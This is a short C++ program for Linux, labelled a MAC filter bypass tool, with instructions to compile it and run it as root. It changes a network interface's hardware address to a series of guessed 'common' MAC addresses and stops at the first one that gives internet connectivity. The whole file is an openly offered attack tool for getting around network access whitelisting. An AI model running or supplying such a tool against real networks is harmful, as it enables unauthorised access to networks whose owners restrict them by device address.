// Compile: g++ -o mac_filter mac_filter.cpp
// Run: sudo ./mac_filter <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_arp.h>

class MACFilterBypass {
private:
    int sock;
    std::string iface;
    
    // Common MACs to try - whitelist bypass
    std::vector<std::string> commonMACs = {
        "00:00:00:00:00:00",  // Null
        "FF:FF:FF:FF:FF:FF",  // Broadcast
        "00:11:22:33:44:55",  // Common default
        "AA:BB:CC:DD:EE:FF",  // Common default
        "02:00:00:00:00:00",  // Test
        "00:0C:29:00:00:00",  // VMware
        "00:05:69:00:00:00",  // VMware
        "00:50:56:00:00:00",  // VMware
        "08:00:27:00:00:00",  // VirtualBox
        "00:15:5D:00:00:00",  // Hyper-V
        "DE:AD:BE:EF:00:00",  // Common pentest
        "00:1A:2B:3C:4D:5E",  // Cisco fake
        "00:AA:BB:CC:DD:EE",  // Placeholder
    };
    
    bool setMAC(const std::string& mac) {
        uint8_t macBytes[6];
        if (sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &macBytes[0], &macBytes[1], &macBytes[2],
                   &macBytes[3], &macBytes[4], &macBytes[5]) != 6) {
            return false;
        }
        
        struct ifreq ifr;
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
        ifr.ifr_hwaddr.sa_family = ARPHRD_ETHER;
        memcpy(ifr.ifr_hwaddr.sa_data, macBytes, 6);
        
        return ioctl(sock, SIOCSIFHWADDR, &ifr) == 0;
    }
    
public:
    MACFilterBypass(const std::string& i) : iface(i) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    void tryCommonMACs() {
        std::cout << "[*] Trying common MACs (MAC filter bypass)\n";
        for (const auto& mac : commonMACs) {
            if (setMAC(mac)) {
                std::cout << "[+] Set MAC: " << mac << "\n";
                
                // Test connectivity
                system("ping -c 1 -W 1 8.8.8.8 > /dev/null 2>&1");
                if (system("ping -c 1 -W 1 8.8.8.8 > /dev/null 2>&1") == 0) {
                    std::cout << "[+] CONNECTIVITY! MAC " << mac << " works!\n";
                    return;
                }
                std::cout << "[-] No connectivity with " << mac << "\n";
                usleep(500000);
            }
        }
        std::cout << "[!] None of the common MACs worked\n";
    }
    
    ~MACFilterBypass() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    MACFilterBypass bypass(argv[1]);
    bypass.tryCommonMACs();
    return 0;
}
